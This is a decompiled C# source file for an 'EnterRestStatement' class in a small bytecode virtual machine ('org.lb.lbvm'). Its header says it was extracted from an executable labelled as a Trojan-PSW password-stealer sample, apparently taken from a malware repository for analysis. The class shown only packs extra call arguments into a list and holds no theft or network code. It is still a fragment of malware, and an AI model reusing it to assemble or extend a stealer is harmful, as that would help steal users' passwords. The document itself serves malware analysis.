// Decompiled with JetBrains decompiler
// Type: org.lb.lbvm.runtime.EnterRestStatement
// Assembly: ISectionEnt, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 94D57F93-A342-4E0D-9A4D-9518717BA689
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\Trojan-PSW.Win32.Stealer.aezv-723abb6b0dee5d6f012a695ca483478595a08ba3b0dc73ca2032c8d4699605cb.exe

using org.lb.lbvm.exceptions;

namespace org.lb.lbvm.runtime
{
  internal sealed class EnterRestStatement : Statement
  {
    private readonly int NumberOfParameters;
    private readonly int NumberOfParametersToSkip;
    private readonly Symbol Symbol;
    private readonly ValueStack skipStack = new ValueStack();

    internal EnterRestStatement(
      int numberOfParameters,
      int numberOfParametersToSkip,
      Symbol symbol)
      : base(13, "ENTERR " + numberOfParameters.ToString() + " " + numberOfParametersToSkip.ToString() + " " + symbol?.ToString())
    {
      this.NumberOfParameters = numberOfParameters;
      this.NumberOfParametersToSkip = numberOfParametersToSkip;
      this.Symbol = symbol;
    }

    internal override void Execute(
      ref int ip,
      ValueStack valueStack,
      EnvironmentStack envStack,
      CallStack callStack)
    {
      int numberOfParameters = callStack.GetLastNumberOfParameters();
      if (numberOfParameters < this.NumberOfParameters - 1)
        throw new RuntimeException(this.Symbol?.ToString() + ": Invalid parameter count");
      object second = (object) Nil.GetInstance();
      for (int index = 0; index < this.NumberOfParametersToSkip; ++index)
        this.skipStack.Push(valueStack.Pop());
      int num = 1 + numberOfParameters - this.NumberOfParameters;
      for (int index = 0; index < num; ++index)
        second = (object) new Pair(valueStack.Pop(), second);
      valueStack.Push(second);
      for (int index = 0; index < this.NumberOfParametersToSkip; ++index)
        valueStack.Push(this.skipStack.Pop());
      envStack.PushNew();
      ip += this.Length;
    }
  }
}
